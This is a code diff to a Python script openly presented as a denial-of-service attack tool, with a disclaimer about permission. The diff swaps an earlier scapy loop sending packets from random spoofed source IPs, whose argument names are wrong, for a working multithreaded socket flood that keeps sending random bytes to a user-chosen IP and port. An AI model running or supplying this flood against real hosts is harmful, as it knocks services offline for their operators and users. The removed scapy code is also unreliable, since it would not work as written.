@@ -7,6 +7,7 @@ import random
 #Code Time
 from datetime import datetime
 from scapy.all import *
+import threading
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -27,9 +28,11 @@ print("Disclaimer: Illecit use of this tool could lead to a violation of federal
 print("Use this tool only on your own website or websites from which you have obtained permission.")
 print("License: The source code of this tool is under the MIT License. © 2022 Tommaso Bona")
 print()
-target_IP = input("Enter IP address of Target: ")
-source_port = int(input("Enter Port Number of Target(Suggested 80/tcp or 443/tcp):"))
-i = 1
+ip = str(input("[Q] target 1's IP:"))
+port = int(input("[Q] Port(must be an number): "))
+pack = int(input("[Q] packet/s(must be an number): "))
+thread = int(input("[Q] Thread(must be an number): "))
+time.sleep(2)
 os.system("clear")
 print("\033[91m")
 os.system("figlet DoS Attack")
@@ -45,19 +48,24 @@ print("[===============     ] 75%")
 time.sleep(2)
 print("[====================] 100%")
 time.sleep(1)
-sent = 0
-while True:
-   a = str(random.randint(1,254))
-   b = str(random.randint(1,254))
-   c = str(random.randint(1,254))
-   d = str(random.randint(1,254))
-   dot = (".")
-   
-   source_IP = a + dot + b + dot + c + dot + d
-   IP1 = IP(source_IP = source_IP, destination = target_IP)
-   TCP1 = TCP(srcport = source_port, dstport = 80)
-   pkt = IP1 / TCP1
-   send(pkt,inter = .001)
-   print ("packet sent ", i)
-   i = i + 1
+def start():
+    hh = random._urandom(10)
+    xx = int(0)
+    while True:
+        try:
+            s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(hh)
+            for i in range(pack):
+                s.send(hh)
+            xx += 1
+            print("yep we attackin "+ip+" | sent: "+str(xx))
+        except:
+            s.close()
+            print("Packet sent")
+            time.sleep(1)
+
+for x in range(thread):
+    thread = threading.Thread(target=start)
+    thread.start()
    
